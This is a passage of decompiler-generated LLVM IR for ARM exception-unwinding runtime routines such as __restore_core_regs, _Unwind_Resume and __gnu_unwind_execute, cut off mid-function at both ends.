  %v2_18894 = load i32, i32* @r4, align 4
  %v8_18894 = shl i32 %v2_18894, %arg1
  %v9_18894 = and i32 %v8_18894, %arg1
  %v2_18898 = load i32, i32* @ip, align 4
  %v8_18898 = shl i32 %v2_18898, %v9_18894
  %v9_18898 = and i32 %v8_18898, %v9_18894
  %v8_1889c = shl i32 %v9_18898, %v9_18898
  %v9_1889c = and i32 %v8_1889c, %v9_18898
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_18894, %bb
  %v10_1889c = phi i32 [ %arg1, %dec_label_pc_18894 ], [ %v9_1889c, %bb ]
  ret i32 %v10_1889c

; uselistorder directives
  uselistorder i32 %v9_18898, { 0, 2, 1 }
  uselistorder i1 false, { 0, 1, 2, 55, 56, 57, 58, 59, 44, 34, 14, 15, 11, 16, 45, 46, 47, 48, 49, 53, 9, 10, 12, 50, 51, 52, 7, 3, 5, 43, 17, 6, 18, 4, 19, 54, 20, 21, 35, 23, 26, 25, 24, 29, 36, 37, 38, 22, 39, 40, 41, 42, 27, 13, 28, 8, 31, 33, 30, 32, 60, 61, 62, 63 }
  uselistorder i1* @cpsr_z, { 3, 4, 17, 18, 20, 21, 22, 19, 23, 24, 25, 26, 5, 27, 28, 6, 7, 77, 78, 8, 1, 9, 10, 11, 12, 33, 34, 72, 74, 76, 75, 73, 29, 30, 31, 2, 13, 32, 79, 80, 14, 15, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 0, 53, 68, 69, 70, 71, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 16 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__aeabi_unwind_cpp_pr2(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_188a4 = load i32, i32* @r1, align 4
  %v2_188a4 = load i32, i32* @r2, align 4
  %v4_188a4 = call i32 @__gnu_unwind_pr_common(i32 2, i32 %v1_188a4, i32 %v2_188a4, i32 2)
  ret i32 %v4_188a4
}

define i32 @__aeabi_unwind_cpp_pr1(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_188ac = load i32, i32* @r1, align 4
  %v2_188ac = load i32, i32* @r2, align 4
  %v4_188ac = call i32 @__gnu_unwind_pr_common(i32 1, i32 %v1_188ac, i32 %v2_188ac, i32 1)
  ret i32 %v4_188ac
}

define i32 @__aeabi_unwind_cpp_pr0(i32 %state, i32 %ucbp, i32 %context) local_unnamed_addr {
entry:
  %v1_188b4 = load i32, i32* @r1, align 4
  %v2_188b4 = load i32, i32* @r2, align 4
  %v4_188b4 = call i32 @__gnu_unwind_pr_common(i32 0, i32 %v1_188b4, i32 %v2_188b4, i32 0)
  ret i32 %v4_188b4

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32)* @__gnu_unwind_pr_common, { 2, 1, 0 }
  uselistorder i32* @r2, { 21, 23, 22, 335, 10, 330, 24, 29, 65, 66, 73, 74, 11, 75, 67, 68, 69, 70, 71, 20, 72, 76, 77, 78, 17, 285, 300, 301, 293, 294, 295, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 18, 44, 45, 46, 47, 48, 49, 50, 51, 52, 12, 53, 54, 55, 56, 298, 299, 296, 297, 8, 60, 59, 1, 131, 132, 133, 79, 80, 134, 138, 139, 306, 307, 89, 136, 137, 302, 303, 140, 81, 290, 289, 2, 291, 292, 284, 118, 308, 61, 62, 63, 64, 314, 309, 311, 141, 142, 143, 144, 145, 146, 82, 147, 148, 149, 150, 151, 331, 332, 333, 83, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 57, 13, 58, 304, 310, 175, 3, 315, 312, 313, 287, 14, 4, 288, 286, 119, 120, 121, 102, 103, 104, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 176, 336, 337, 338, 339, 340, 341, 177, 178, 9, 0, 108, 179, 180, 109, 305, 122, 181, 182, 183, 25, 123, 26, 124, 125, 126, 84, 184, 316, 318, 319, 320, 321, 317, 334, 112, 185, 322, 323, 324, 325, 326, 327, 328, 329, 186, 187, 188, 189, 190, 198, 196, 191, 192, 193, 197, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 194, 195, 211, 213, 214, 5, 215, 216, 217, 218, 219, 220, 221, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 27, 222, 113, 233, 234, 235, 236, 237, 238, 239, 240, 15, 241, 212, 114, 242, 16, 19, 135, 85, 86, 87, 88, 243, 244, 245, 246, 247, 248, 249, 250, 252, 251, 254, 253, 255, 256, 257, 258, 259, 261, 260, 262, 263, 264, 265, 6, 278, 279, 280, 281, 266, 267, 269, 268, 270, 271, 272, 273, 275, 274, 276, 277, 359, 360, 90, 91, 7, 92, 93, 94, 95, 96, 97, 98, 28, 99, 100, 101, 105, 106, 107, 110, 111, 115, 116, 117, 127, 128, 129, 130, 282, 283 }
}

define i32 @__restore_core_regs(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_188bc = add i32 %tmp, 56
  %v4_188bc = inttoptr i32 %v3_188bc to i32*
  %v5_188bc = load i32, i32* %v4_188bc, align 4
  %v6_188bc = add i32 %tmp, 60
  %v7_188bc = inttoptr i32 %v6_188bc to i32*
  %v8_188bc = load i32, i32* %v7_188bc, align 4
  %v2_188c8 = load i32, i32* %arg1, align 4
  %v3_188c8 = add i32 %tmp, 4
  %v4_188c8 = inttoptr i32 %v3_188c8 to i32*
  %v5_188c8 = load i32, i32* %v4_188c8, align 4
  store i32 %v5_188c8, i32* @r1, align 4
  %v12_188c8 = add i32 %tmp, 16
  %v13_188c8 = inttoptr i32 %v12_188c8 to i32*
  %v14_188c8 = load i32, i32* %v13_188c8, align 4
  store i32 %v14_188c8, i32* @r4, align 4
  %v15_188c8 = add i32 %tmp, 20
  %v16_188c8 = inttoptr i32 %v15_188c8 to i32*
  %v17_188c8 = load i32, i32* %v16_188c8, align 4
  store i32 %v17_188c8, i32* @r5, align 4
  %v18_188c8 = add i32 %tmp, 24
  %v19_188c8 = inttoptr i32 %v18_188c8 to i32*
  %v20_188c8 = load i32, i32* %v19_188c8, align 4
  store i32 %v20_188c8, i32* @r6, align 4
  %v21_188c8 = add i32 %tmp, 28
  %v22_188c8 = inttoptr i32 %v21_188c8 to i32*
  %v23_188c8 = load i32, i32* %v22_188c8, align 4
  store i32 %v23_188c8, i32* @r7, align 4
  %v24_188c8 = add i32 %tmp, 32
  %v25_188c8 = inttoptr i32 %v24_188c8 to i32*
  %v26_188c8 = load i32, i32* %v25_188c8, align 4
  store i32 %v26_188c8, i32* @r8, align 4
  %v27_188c8 = add i32 %tmp, 36
  %v28_188c8 = inttoptr i32 %v27_188c8 to i32*
  %v29_188c8 = load i32, i32* %v28_188c8, align 4
  store i32 %v29_188c8, i32* @sb, align 4
  %v30_188c8 = add i32 %tmp, 40
  %v31_188c8 = inttoptr i32 %v30_188c8 to i32*
  %v32_188c8 = load i32, i32* %v31_188c8, align 4
  store i32 %v32_188c8, i32* @sl, align 4
  %v33_188c8 = add i32 %tmp, 44
  %v34_188c8 = inttoptr i32 %v33_188c8 to i32*
  %v35_188c8 = load i32, i32* %v34_188c8, align 4
  store i32 %v35_188c8, i32* @fp, align 4
  store i32 %v8_188bc, i32* @ip, align 4
  store i32 %v5_188bc, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v8_188bc)
  ret i32 %v2_188c8

; uselistorder directives
  uselistorder i32 %v8_188bc, { 1, 0 }
  uselistorder i32 %tmp, { 8, 7, 6, 5, 4, 3, 2, 1, 0, 10, 9 }
  uselistorder void (i32)* @__pseudo_branch, { 34, 27, 28, 29, 30, 31, 32, 33, 35, 36, 37, 19, 21, 3, 24, 25, 9, 2, 10, 0, 1, 38, 26, 20, 11, 12, 13, 14, 15, 16, 17, 22, 23, 6, 7, 8, 18, 39, 40, 41, 4, 5 }
  uselistorder i32* @ip, { 107, 11, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 31, 32, 26, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 33, 0, 34, 27, 28, 35, 4, 36, 10, 3, 37, 38, 39, 2, 40, 41, 42, 43, 44, 8, 45, 99, 100, 46, 94, 95, 96, 97, 101, 47, 48, 29, 49, 50, 51, 52, 53, 131, 132, 133, 134, 102, 93, 103, 54, 55, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 56, 122, 123, 5, 124, 125, 126, 127, 128, 129, 130, 57, 58, 59, 60, 61, 62, 66, 68, 6, 69, 63, 64, 65, 67, 1, 98, 70, 104, 105, 74, 71, 9, 72, 73, 75, 76, 77, 78, 79, 7, 80, 81, 82, 83, 84, 85, 13, 14, 15, 86, 87, 88, 89, 90, 91, 92, 158, 159, 12, 30, 106 }
  uselistorder i32* @fp, { 85, 86, 87, 6, 7, 88, 89, 90, 91, 28, 41, 29, 32, 30, 31, 33, 34, 1, 0, 39, 40, 35, 36, 37, 38, 5, 42, 43, 44, 45, 46, 47, 48, 4, 49, 50, 51, 52, 53, 54, 55, 56, 2, 57, 58, 59, 60, 61, 74, 75, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 3, 72, 73, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 76, 77, 78, 79, 80, 81, 82, 83, 84 }
  uselistorder i32 44, { 12, 11, 8, 9, 4, 5, 10, 0, 3, 6, 1, 2, 7 }
  uselistorder i32 40, { 9, 5, 6, 7, 8, 4, 0, 1, 2, 3 }
  uselistorder i32* @sb, { 131, 132, 36, 37, 38, 127, 128, 129, 14, 17, 0, 15, 16, 2, 6, 5, 18, 19, 20, 21, 1, 22, 13, 23, 24, 25, 26, 27, 28, 3, 12, 29, 130, 34, 35, 30, 31, 46, 47, 49, 48, 51, 50, 52, 53, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 54, 55, 56, 71, 72, 57, 58, 59, 7, 60, 61, 62, 67, 68, 69, 70, 63, 64, 65, 66, 32, 73, 74, 75, 76, 77, 33, 78, 81, 8, 79, 11, 80, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 101, 100, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 125, 126, 39, 40, 41, 42, 43, 44, 45, 112, 113, 114, 115, 116, 117, 118, 119, 120, 9, 121, 10, 122, 123, 4, 124 }
  uselistorder i32 36, { 11, 10, 0, 1, 7, 6, 3, 4, 8, 9, 5, 2 }
  uselistorder i32* @r8, { 251, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 9, 250, 252, 57, 26, 217, 224, 225, 220, 221, 10, 29, 30, 31, 32, 33, 34, 0, 35, 36, 1, 37, 6, 11, 40, 38, 39, 41, 42, 47, 48, 44, 43, 46, 45, 222, 223, 73, 75, 12, 76, 74, 77, 78, 49, 253, 254, 255, 226, 227, 228, 229, 50, 54, 55, 56, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 95, 94, 97, 96, 98, 99, 218, 219, 256, 257, 258, 2, 259, 260, 261, 3, 262, 263, 100, 101, 102, 103, 104, 105, 13, 124, 106, 107, 108, 109, 110, 111, 112, 118, 119, 120, 121, 122, 123, 113, 114, 115, 27, 116, 117, 63, 64, 65, 66, 67, 125, 126, 127, 4, 128, 14, 129, 130, 131, 132, 68, 69, 70, 71, 72, 230, 5, 231, 232, 51, 52, 133, 136, 134, 135, 15, 137, 16, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 17, 150, 8, 151, 152, 18, 153, 7, 154, 155, 19, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 215, 216, 20, 58, 179, 180, 181, 182, 183, 184, 185, 186, 187, 21, 28, 188, 189, 190, 191, 192, 193, 194, 195, 196, 203, 204, 22, 211, 212, 23, 213, 214, 197, 24, 198, 199, 200, 201, 202, 205, 25, 206, 207, 208, 209, 210, 59, 60, 61, 62, 264, 265, 53 }
  uselistorder i32 32, { 111, 108, 109, 110, 42, 115, 116, 117, 28, 118, 119, 112, 29, 17, 113, 114, 18, 77, 59, 60, 61, 62, 71, 20, 21, 33, 63, 64, 23, 24, 65, 22, 34, 66, 67, 68, 69, 32, 70, 102, 103, 41, 55, 40, 104, 43, 105, 39, 44, 35, 45, 46, 19, 47, 36, 54, 37, 48, 49, 50, 51, 38, 52, 53, 56, 107, 78, 79, 74, 80, 106, 72, 76, 0, 1, 57, 81, 82, 2, 83, 84, 73, 75, 85, 4, 3, 129, 120, 121, 122, 25, 123, 26, 124, 27, 125, 5, 126, 127, 128, 88, 86, 87, 89, 7, 6, 8, 9, 90, 91, 92, 93, 94, 95, 16, 96, 97, 98, 99, 100, 101, 11, 10, 13, 12, 30, 31, 15, 14, 58 }
  uselistorder i32 28, { 61, 3, 10, 58, 59, 20, 34, 27, 60, 28, 29, 30, 24, 35, 22, 62, 63, 75, 76, 11, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 31, 32, 33, 36, 37, 38, 39, 12, 40, 13, 41, 21, 42, 17, 43, 44, 9, 8, 7, 45, 16, 46, 47, 48, 0, 1, 49, 50, 5, 6, 4, 51, 52, 15, 14, 53, 54, 18, 55, 56, 2, 19, 25, 26, 57, 23 }
  uselistorder i32 24, { 23, 22, 24, 4, 25, 26, 7, 5, 8, 6, 12, 13, 9, 14, 10, 11, 16, 36, 37, 17, 38, 27, 28, 29, 30, 31, 32, 33, 34, 35, 21, 3, 15, 0, 1, 2, 19, 20, 39, 40, 18 }
  uselistorder i32 20, { 41, 8, 39, 40, 42, 1, 6, 16, 17, 33, 34, 35, 0, 26, 27, 18, 13, 14, 36, 19, 20, 21, 15, 51, 52, 53, 54, 43, 44, 45, 46, 47, 48, 49, 50, 37, 38, 10, 22, 23, 24, 25, 28, 31, 5, 9, 2, 3, 4, 29, 7, 30, 32, 11, 12 }
  uselistorder i32* @r1, { 277, 17, 19, 18, 5, 20, 75, 21, 76, 77, 0, 99, 100, 16, 78, 79, 80, 81, 82, 22, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 83, 84, 23, 85, 86, 87, 6, 88, 89, 90, 91, 92, 93, 94, 15, 95, 96, 97, 98, 278, 279, 24, 112, 113, 25, 114, 234, 14, 235, 254, 255, 67, 236, 237, 238, 239, 240, 241, 242, 243, 245, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 65, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 66, 247, 253, 244, 252, 70, 69, 1, 246, 160, 161, 120, 121, 122, 152, 153, 154, 155, 156, 157, 158, 159, 260, 261, 262, 263, 12, 13, 264, 265, 266, 35, 256, 257, 258, 248, 249, 142, 143, 145, 146, 144, 34, 33, 267, 71, 72, 73, 26, 162, 163, 164, 165, 166, 167, 168, 115, 169, 37, 68, 27, 28, 147, 148, 29, 170, 171, 172, 173, 30, 268, 31, 314, 315, 316, 317, 280, 281, 282, 283, 284, 285, 9, 286, 287, 288, 10, 289, 290, 11, 292, 293, 291, 294, 295, 296, 297, 298, 7, 4, 299, 300, 301, 8, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 32, 174, 36, 138, 175, 259, 123, 250, 251, 149, 176, 269, 270, 271, 272, 273, 274, 275, 276, 177, 180, 178, 181, 183, 3, 184, 185, 186, 187, 188, 179, 189, 190, 192, 193, 194, 195, 196, 197, 74, 191, 198, 199, 200, 201, 232, 233, 202, 38, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 2, 214, 215, 216, 217, 218, 219, 228, 229, 230, 231, 220, 221, 222, 223, 224, 225, 226, 227, 116, 117, 118, 119, 318, 319, 182, 39, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 139, 140, 141, 150, 151 }
  uselistorder i32 60, { 0, 8, 9, 10, 2, 6, 3, 4, 5, 7, 1 }
  uselistorder i32 56, { 0, 9, 10, 2, 3, 4, 5, 6, 7, 8, 1 }
}

define i32 @__gnu_Unwind_Restore_VFP(i32 %arg1) local_unnamed_addr {
entry:
  %v1_188d8 = load i32, i32* @r0, align 4
  ret i32 %v1_188d8
}

define i32 @__gnu_Unwind_Save_VFP(i32 %arg1) local_unnamed_addr {
entry:
  %v1_188e0 = load i32, i32* @r0, align 4
  ret i32 %v1_188e0
}

define i32 @___Unwind_RaiseException(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_188f4 = ptrtoint i32* %stack_var_-68 to i32
  %v2_188f8 = call i32 @__gnu_Unwind_RaiseException(i32 %v2_188f4, i32 0)
  ret i32 %v2_188f8

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @___Unwind_Resume(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_18918 = ptrtoint i32* %stack_var_-68 to i32
  %v2_1891c = call i32 @__gnu_Unwind_Resume(i32 %v2_18918, i32 0)
  ret i32 %v2_1891c

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @_Unwind_Resume_or_Rethrow(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_1893c = ptrtoint i32* %stack_var_-68 to i32
  %v2_18940 = call i32 @__gnu_Unwind_Resume_or_Rethrow(i32 %v2_1893c, i32 0)
  ret i32 %v2_18940

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i32 @___Unwind_ForcedUnwind(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  store i32 0, i32* %stack_var_-68, align 4
  %v2_18960 = ptrtoint i32* %stack_var_-68 to i32
  %v6_18964 = call i32 @__gnu_Unwind_ForcedUnwind(i32 %v2_18960, i32 %arg2, i8* %arg3, i32 %v2_18960)
  ret i32 %v6_18964

; uselistorder directives
  uselistorder i32* %stack_var_-68, { 1, 0 }
}

define i8* @_Unwind_GetLanguageSpecificData(i32 %context) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v5_18990 = call i32 @_Unwind_VRS_Get(i32 12, i32 0, i32 12, i32 0, i8* bitcast (i32* @0 to i8*))
  %v1_18998 = add i32 %tmp1, 76
  %v2_18998 = inttoptr i32 %v1_18998 to i32*
  %v3_18998 = load i32, i32* %v2_18998, align 4
  %v1_1899c = add i32 %v3_18998, 7
  %v2_1899c = inttoptr i32 %v1_1899c to i8*
  %v3_1899c = load i8, i8* %v2_1899c, align 1
  %v4_1899c = zext i8 %v3_1899c to i32
  %v1_189a0 = add i32 %v3_18998, 8
  %v3_189a4 = mul nuw nsw i32 %v4_1899c, 4
  %v2_189a8 = add i32 %v3_189a4, %v1_189a0
  %v3_189a8 = inttoptr i32 %v2_189a8 to i8*
  ret i8* %v3_189a8
}

define i32 @__gnu_unwind_execute(i32 %context, %anon_struct_15* %uws) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint %anon_struct_15* %uws to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %context, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v9_189b8 = load i32, i32* @r6, align 4
  %v21_189b8 = load i32, i32* @lr, align 4
  %v0_189bc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_189bc, i32* @r7, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 0, i32* @sl, align 4
  %tmp146 = bitcast i32* %stack_var_-36 to i8*
  br label %dec_label_pc_189cc

dec_label_pc_189cc:                               ; preds = %dec_label_pc_189cc.backedge, %entry
  %v3_189d8 = phi i32 [ %v0_189cc.pre, %dec_label_pc_189cc.backedge ], [ %tmp, %entry ]
  %v1_189cc = add i32 %v3_189d8, 8
  %v2_189cc = inttoptr i32 %v1_189cc to i8*
  %v3_189cc = load i8, i8* %v2_189cc, align 1
  %v4_189cc = zext i8 %v3_189cc to i32
  store i32 %v4_189cc, i32* %r3.global-to-local, align 4
  %v2_189d0 = icmp eq i8 %v3_189cc, 0
  store i1 %v2_189d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_189d0, label %dec_label_pc_189e0, label %.thread

.thread:                                          ; preds = %dec_label_pc_189cc
  %v2_189d4 = add nsw i32 %v4_189cc, -1
  store i32 %v2_189d4, i32* %r3.global-to-local, align 4
  %v2_189d8 = trunc i32 %v2_189d4 to i8
  store i8 %v2_189d8, i8* %v2_189cc, align 1
  %v0_189dc.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_189dc.pr.pr, label %.thread.dec_label_pc_189e0_crit_edge, label %dec_label_pc_18a08

.thread.dec_label_pc_189e0_crit_edge:             ; preds = %.thread
  %v0_189e0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_189e0

dec_label_pc_189e0:                               ; preds = %.thread.dec_label_pc_189e0_crit_edge, %dec_label_pc_189cc
  %v0_189e0 = phi i32 [ %v0_189e0.pre, %.thread.dec_label_pc_189e0_crit_edge ], [ %v3_189d8, %dec_label_pc_189cc ]
  %v1_189e0 = add i32 %v0_189e0, 9
  %v2_189e0 = inttoptr i32 %v1_189e0 to i8*
  %v3_189e0 = load i8, i8* %v2_189e0, align 1
  %v4_189e0 = zext i8 %v3_189e0 to i32
  store i32 %v4_189e0, i32* %r3.global-to-local, align 4
  %v2_189e4 = icmp eq i8 %v3_189e0, 0
  store i1 %v2_189e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_189e4, label %dec_label_pc_18ae8, label %dec_label_pc_189ec

dec_label_pc_189ec:                               ; preds = %dec_label_pc_18adc, %dec_label_pc_189e0
  %v2_189f0 = phi i32 [ %v0_18adc, %dec_label_pc_18adc ], [ %v0_189e0, %dec_label_pc_189e0 ]
  %v0_189ec = phi i32 [ %v4_18adc, %dec_label_pc_18adc ], [ %v4_189e0, %dec_label_pc_189e0 ]
  %v1_189ec = add nsw i32 %v0_189ec, -1
  store i32 %v1_189ec, i32* %r3.global-to-local, align 4
  %v1_189f0 = trunc i32 %v1_189ec to i8
  %v3_189f0 = add i32 %v2_189f0, 9
  %v4_189f0 = inttoptr i32 %v3_189f0 to i8*
  store i8 %v1_189f0, i8* %v4_189f0, align 1
  %v0_189f4 = load i32, i32* @r5, align 4
  %v1_189f4 = add i32 %v0_189f4, 4
  %v2_189f4 = inttoptr i32 %v1_189f4 to i32*
  %v3_189f4 = load i32, i32* %v2_189f4, align 4
  store i32 %v3_189f4, i32* %r2.global-to-local, align 4
  %v1_189f8 = inttoptr i32 %v3_189f4 to i32*
  %v2_189f8 = load i32, i32* %v1_189f8, align 4
  store i32 %v2_189f8, i32* %r0.global-to-local, align 4
  %v4_189f8 = add i32 %v3_189f4, 4
  store i32 %v4_189f8, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_18a00 = inttoptr i32 %v0_189f4 to i32*
  store i32 %v2_189f8, i32* %v1_18a00, align 4
  %v5_18a00 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_18a00, i32* %v2_189f4, align 4
  %v0_18a04 = load i32, i32* %r3.global-to-local, align 4
  %v1_18a04 = trunc i32 %v0_18a04 to i8
  %v2_18a04 = load i32, i32* @r5, align 4
  %v3_18a04 = add i32 %v2_18a04, 8
  %v4_18a04 = inttoptr i32 %v3_18a04 to i8*
  store i8 %v1_18a04, i8* %v4_18a04, align 1
  br label %dec_label_pc_18a08

dec_label_pc_18a08:                               ; preds = %.thread, %dec_label_pc_189ec, %.thread6
  %v0_18a08 = load i32, i32* @r5, align 4
  %v1_18a08 = inttoptr i32 %v0_18a08 to i32*
  %v2_18a08 = load i32, i32* %v1_18a08, align 4
  %v3_18a0c = udiv i32 %v2_18a08, 16777216
  store i32 %v3_18a0c, i32* @r4, align 4
  store i32 %v3_18a0c, i32* %ip.global-to-local, align 4
  %v3_18a14 = mul i32 %v2_18a08, 256
  store i32 %v3_18a14, i32* %r0.global-to-local, align 4
  %tmp182 = and i32 %v2_18a08, -16777216
  %tmp183 = icmp eq i32 %tmp182, -1342177280
  store i1 %tmp183, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_18a14, i32* %v1_18a08, align 4
  br i1 %tmp183, label %dec_label_pc_18ae8, label %dec_label_pc_18a24

dec_label_pc_18a24:                               ; preds = %dec_label_pc_18a08
  %v0_18a24 = load i32, i32* @r4, align 4
  %v1_18a24 = and i32 %v0_18a24, 128
  store i32 %v1_18a24, i32* %r1.global-to-local, align 4
  %v2_18a24 = icmp eq i32 %v1_18a24, 0
  store i1 %v2_18a24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18a24, label %dec_label_pc_18b00, label %dec_label_pc_18a2c

dec_label_pc_18a2c:                               ; preds = %dec_label_pc_18a24
  %v1_18a2c = and i32 %v0_18a24, 240
  store i32 %v1_18a2c, i32* @r6, align 4
  %v7_18a30 = icmp eq i32 %v1_18a2c, 128
  store i1 %v7_18a30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18a30, label %dec_label_pc_18a38, label %dec_label_pc_18b5c

dec_label_pc_18a38:                               ; preds = %dec_label_pc_18a2c
  %v0_18a38 = load i32, i32* @r5, align 4
  %v1_18a38 = add i32 %v0_18a38, 8
  %v2_18a38 = inttoptr i32 %v1_18a38 to i8*
  %v3_18a38 = load i8, i8* %v2_18a38, align 1
  %v4_18a38 = zext i8 %v3_18a38 to i32
  store i32 %v4_18a38, i32* %r3.global-to-local, align 4
  %v2_18a3c = icmp eq i8 %v3_18a38, 0
  store i1 %v2_18a3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18a3c, label %dec_label_pc_18a4c, label %.thread3

.thread3:                                         ; preds = %dec_label_pc_18a38
  %v2_18a40 = add nsw i32 %v4_18a38, -1
  store i32 %v2_18a40, i32* %r3.global-to-local, align 4
  %v2_18a44 = trunc i32 %v2_18a40 to i8
  store i8 %v2_18a44, i8* %v2_18a38, align 1
  %v0_18a48.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18a48.pr.pr, label %.thread3.dec_label_pc_18a4c_crit_edge, label %dec_label_pc_18a7c

.thread3.dec_label_pc_18a4c_crit_edge:            ; preds = %.thread3
  %v0_18a4c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18a4c

dec_label_pc_18a4c:                               ; preds = %.thread3.dec_label_pc_18a4c_crit_edge, %dec_label_pc_18a38
  %v2_18a60 = phi i32 [ %v0_18a4c.pre, %.thread3.dec_label_pc_18a4c_crit_edge ], [ %v0_18a38, %dec_label_pc_18a38 ]
  %v1_18a4c = add i32 %v2_18a60, 9
  %v2_18a4c = inttoptr i32 %v1_18a4c to i8*
  %v3_18a4c = load i8, i8* %v2_18a4c, align 1
  %v4_18a4c = zext i8 %v3_18a4c to i32
  store i32 %v4_18a4c, i32* %r3.global-to-local, align 4
  %v2_18a50 = icmp eq i8 %v3_18a4c, 0
  store i1 %v2_18a50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18a50, label %dec_label_pc_18a8c, label %dec_label_pc_18a5c

dec_label_pc_18a5c:                               ; preds = %dec_label_pc_18a4c
  %v1_18a5c = add nsw i32 %v4_18a4c, -1
  store i32 %v1_18a5c, i32* %r3.global-to-local, align 4
  %v1_18a60 = trunc i32 %v1_18a5c to i8
  store i8 %v1_18a60, i8* %v2_18a4c, align 1
  %v0_18a64 = load i32, i32* @r5, align 4
  %v1_18a64 = add i32 %v0_18a64, 4
  %v2_18a64 = inttoptr i32 %v1_18a64 to i32*
  %v3_18a64 = load i32, i32* %v2_18a64, align 4
  store i32 %v3_18a64, i32* %r2.global-to-local, align 4
  %v1_18a68 = inttoptr i32 %v3_18a64 to i32*
  %v2_18a68 = load i32, i32* %v1_18a68, align 4
  store i32 %v2_18a68, i32* %r0.global-to-local, align 4
  %v4_18a68 = add i32 %v3_18a64, 4
  store i32 %v4_18a68, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_18a68, i32* %v2_18a64, align 4
  %v0_18a74 = load i32, i32* %r3.global-to-local, align 4
  %v1_18a74 = trunc i32 %v0_18a74 to i8
  %v2_18a74 = load i32, i32* @r5, align 4
  %v3_18a74 = add i32 %v2_18a74, 8
  %v4_18a74 = inttoptr i32 %v3_18a74 to i8*
  store i8 %v1_18a74, i8* %v4_18a74, align 1
  %v0_18a78 = load i32, i32* %r0.global-to-local, align 4
  %v1_18a78 = load i32, i32* @r5, align 4
  %v2_18a78 = inttoptr i32 %v1_18a78 to i32*
